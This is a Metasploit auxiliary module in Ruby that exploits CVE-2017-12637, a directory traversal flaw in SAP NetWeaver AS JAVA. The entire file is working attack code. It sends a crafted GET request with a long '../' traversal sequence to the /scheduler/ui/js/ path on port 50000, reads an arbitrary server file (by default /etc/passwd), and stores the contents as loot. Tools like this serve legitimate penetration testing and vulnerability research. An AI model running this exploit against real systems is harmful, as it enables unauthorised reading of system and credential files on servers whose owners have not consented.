##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SAP NetWeaver AS JAVA Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability found in SAP NetWeaver AS JAVA on default 50000 port.
      },
      'References'     =>
        [
          [ 'CVE', '2017-12637' ],
          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2017-12637' ],
        ],
      'Author'         =>
        [
          'Vahagn @vah_13 Vardanian'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Aug 28 2017"
    ))

    register_options(
      [
        Opt::RPORT(50000),
        OptString.new("FILEPATH", [true, 'Set a file path on the server', '/etc/passwd'])
      ])

    deregister_options('RHOST')
  end

  def run_host(ip)
    # No point to continue if no filename is specified
    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
      print_error("Please supply the name of the file you want to download")
      return
    end

    print_status("Attempting to download: #{datastore['FILEPATH']}")

    # Create request
    traversal = "/../../../../../../../../../../../../../../../../"
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/scheduler/ui/js/?#{traversal}/#{datastore['FILEPATH']}"
    }, 25)

    print_status("Server returns HTTP code: #{res.code.to_s}")

    # Show data if needed
    if res and res.code == 200
      vprint_line(res.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'sap.http',
        'application/octet-stream',
        ip,
        res.body,
        fname
      )
      print_status("File saved in: #{path}")
    else
      print_error("Nothing was downloaded")
    end
  end
end
